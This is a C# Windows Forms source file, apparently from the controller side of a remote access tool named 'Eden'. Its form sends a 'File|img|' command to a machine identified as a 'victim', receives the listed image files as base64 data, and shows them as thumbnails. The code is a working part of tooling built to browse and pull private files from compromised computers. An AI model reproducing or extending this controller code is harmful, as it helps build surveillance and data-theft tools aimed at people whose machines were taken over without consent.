using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Eden
{
    public partial class frmFileImage : Form
    {
        public Client m_clnt;
        public string m_szVictimID;
        struct stImageItem
        {
            public string szFilename;
            public Image img;
        }

        public List<string> m_lsImgFilename;

        private ImageList m_ImageList;

        void Received(Client clnt, string szVictimID, string[] aMsg)
        {
            if (aMsg[0] == "file")
            {
                if (aMsg[1] == "img")
                {
                    List<List<string>> lsResults = Tools.EZData.String2TwoDList(aMsg[2]);
                    foreach (var result in lsResults)
                    {
                        string szImgFilename = result[0];
                        int nCode = int.Parse(result[1]);
                        string szMsg = result[2];

                        if (nCode == 0)
                        {
                            MessageBox.Show(szMsg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        }
                        else
                        {
                            Image img = Tools.Base64ToIamge(szMsg);
                            stImageItem st = new stImageItem()
                            {
                                szFilename = szImgFilename,
                                img = img,
                            };

                            ListViewItem item = new ListViewItem(szImgFilename.Split('/').Last());
                            item.Tag = st;
                            item.ImageKey = szImgFilename;

                            Invoke(new Action(() =>
                            {
                                m_ImageList.Images.Add(szImgFilename, img);
                                listView1.Items.Add(item);
                            }));
                        }
                    }
                }
            }
        }

        public frmFileImage()
        {
            InitializeComponent();
        }

        void setup()
        {
            m_clnt.ServerMessageReceived += Received;

            m_ImageList = new ImageList();
            listView1.View = View.LargeIcon;
            listView1.LargeImageList = m_ImageList;

            m_clnt.SendVictim(m_szVictimID, "File|img|" + Tools.EZData.OneDList2String(m_lsImgFilename));
        }

        private void frmFileImage_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void frmFileImage_FormClosed(object sender, FormClosedEventArgs e)
        {
            m_clnt.ServerMessageReceived -= Received;
        }
    }
}
